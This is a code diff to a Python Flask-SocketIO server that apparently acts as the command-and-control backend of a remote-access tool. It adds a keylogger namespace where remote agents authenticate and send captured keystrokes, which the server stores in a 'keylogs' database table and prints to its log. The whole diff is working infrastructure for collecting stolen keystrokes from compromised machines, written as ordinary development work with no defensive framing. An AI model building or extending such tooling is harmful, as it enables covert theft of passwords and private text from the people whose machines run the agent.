@@ -11,6 +11,20 @@ def init_socket_handlers(socketio):
     active_agents = {}  
     connection_count = 0
 
+    # Ensure keylogs table exists
+    conn = sqlite3.connect(CONFIG.database)
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS keylogs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            agent_id TEXT NOT NULL,
+            keys TEXT NOT NULL,
+            timestamp TEXT NOT NULL
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
     @socketio.on('connect', namespace='/terminal')
     def handle_terminal_connect():
         nonlocal connection_count
@@ -72,6 +86,34 @@ def init_socket_handlers(socketio):
                 'message': str(e),
                 'agent_id': data['agent_id']
             }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+            return False
+
+    @socketio.on('agent_connect', namespace='/keylogger')
+    def handle_keylogger_agent_connect(data):
+        try:
+            print(f"[SocketIO] Keylogger agent connection attempt: {data['agent_id']}")
+            decrypted = SecureComms.decrypt(data['auth_token'])
+            if decrypted.get('agent_id') != data['agent_id']:
+                print("[SocketIO] Keylogger authentication failed: Invalid token")
+                return False
+            
+            join_room(f"agent_{data['agent_id']}", namespace='/keylogger')
+            active_agents[data['agent_id']] = True
+            print(f"[SocketIO] Keylogger agent authenticated: {data['agent_id']}")
+            
+            emit('agent_connected', {
+                'status': 'success',
+                'agent_id': data['agent_id']
+            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
+            
+            return True
+        except Exception as e:
+            print(f"[SocketIO] Keylogger agent connection error: {str(e)}")
+            emit('status', {
+                'status': 'error',
+                'message': str(e),
+                'agent_id': data['agent_id']
+            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
             return False
         
 
@@ -188,22 +230,29 @@ def init_socket_handlers(socketio):
                     'message': 'WebSocket disconnected'
                 }, room=f"terminal_{agent_id}", namespace='/terminal')
 
-    @socketio.on('keylogger_data', namespace='/terminal')
+    @socketio.on('keylogger_data', namespace='/keylogger')
     def handle_keylogger_data(data):
-        if not current_user.is_authenticated:
-            return
         agent_id = data.get('agent_id')
         keys = data.get('keys')
         timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
         if not agent_id or not keys:
+            print("[SocketIO] keylogger_data event missing agent_id or keys")
+            return
+        if agent_id not in active_agents:
+            print("[SocketIO] Unauthorized keylogger_data event received")
             return
         try:
+            print(f"[SocketIO] Saving keylogger data for agent {agent_id}: {keys}")
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
+            c.execute("PRAGMA foreign_keys = ON")
             c.execute("INSERT INTO keylogs (agent_id, keys, timestamp) VALUES (?, ?, ?)", (agent_id, keys, timestamp))
             conn.commit()
             conn.close()
-            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/terminal')
+            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/keylogger')
+        except sqlite3.IntegrityError as e:
+            print(f"[SocketIO] Database integrity error saving keylogger data: {str(e)}")
+            emit('keylogger_ack', {'status': 'error', 'message': 'Database integrity error'}, room=f"agent_{agent_id}", namespace='/keylogger')
         except Exception as e:
             print(f"[SocketIO] Error saving keylogger data: {str(e)}")
-            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/terminal')
+            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/keylogger')
